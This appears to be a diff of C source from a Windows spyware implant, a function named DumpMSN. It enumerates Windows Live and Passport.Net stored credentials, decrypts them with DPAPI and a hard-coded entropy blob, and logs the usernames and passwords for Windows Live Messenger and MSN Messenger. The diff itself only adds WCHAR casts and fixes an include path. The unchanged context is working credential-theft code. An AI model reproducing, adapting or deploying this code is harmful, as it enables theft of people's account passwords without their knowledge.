@@ -5,7 +5,7 @@
 #include <string.h>
 
 #include <windows.h>
-#include "..\common.h"
+#include "../../H4DLL/common.h"
 #import "pstorec.dll" no_namespace
 #include <WinCred.h>
 
@@ -52,7 +52,7 @@ int DumpMSN(void)
 	if ( pfCredEnumerate && pfCredFree ) { 
 		dwCount = 0;  
 		CredentialCollection = NULL;
-		pfCredEnumerate(L"WindowsLive:name=*", 0, &dwCount, &CredentialCollection);
+		pfCredEnumerate((WCHAR*)L"WindowsLive:name=*", 0, &dwCount, &CredentialCollection);
 		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
 			WCHAR password[300];
 			DWORD size = CredentialCollection[dwTempIndex]->CredentialBlobSize;
@@ -62,7 +62,7 @@ int DumpMSN(void)
 			if (size < sizeof(password)-sizeof(WCHAR) )
 				memcpy(password, CredentialCollection[dwTempIndex]->CredentialBlob, size);
 			
-			LogPassword(L"Windows Live Messenger", L"Live Messenger 2008/2009", CredentialCollection[dwTempIndex]->UserName, password);
+			LogPassword((WCHAR*)L"Windows Live Messenger", (WCHAR*)L"Live Messenger 2008/2009", CredentialCollection[dwTempIndex]->UserName, password);
 		}
 		if (CredentialCollection) 
 			pfCredFree(CredentialCollection);
@@ -74,7 +74,7 @@ int DumpMSN(void)
 
 		dwCount = 0;    
 		CredentialCollection = NULL;
-		pfCredEnumerate(L"Passport.Net\\*", 0, &dwCount, &CredentialCollection);
+		pfCredEnumerate((WCHAR *)L"Passport.Net\\*", 0, &dwCount, &CredentialCollection);
 		entropy_blob.cbData = 0x4A;
 		entropy_blob.pbData = Entropy;
 		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
@@ -88,7 +88,7 @@ int DumpMSN(void)
 
 			memset(pass, 0, sizeof(pass));
 			memcpy(pass, out_blob.pbData, (out_blob.cbData < 256) ? out_blob.cbData : 254 );
-			LogPassword(L"Windows Messenger", L"MSN Messenger 7.0", CredentialCollection[dwTempIndex]->UserName, pass);
+			LogPassword((WCHAR*)L"Windows Messenger", (WCHAR*)L"MSN Messenger 7.0", CredentialCollection[dwTempIndex]->UserName, pass);
 			LocalFree(out_blob.pbData);		
 		}
 		if (CredentialCollection) 
@@ -142,7 +142,7 @@ int DumpMSN(void)
 												memset(pass, 0, sizeof(pass));
 												memcpy(pass, pass_blob.pbData, (pass_blob.cbData < 256) ? pass_blob.cbData : 254 );
 												
-												LogPassword(L"Windows Messenger", L"MSN Messenger 7.5", key_name, pass);
+												LogPassword((WCHAR*)L"Windows Messenger", (WCHAR*)L"MSN Messenger 7.5", key_name, pass);
 												LocalFree(pass_blob.pbData);
 											}
 										}
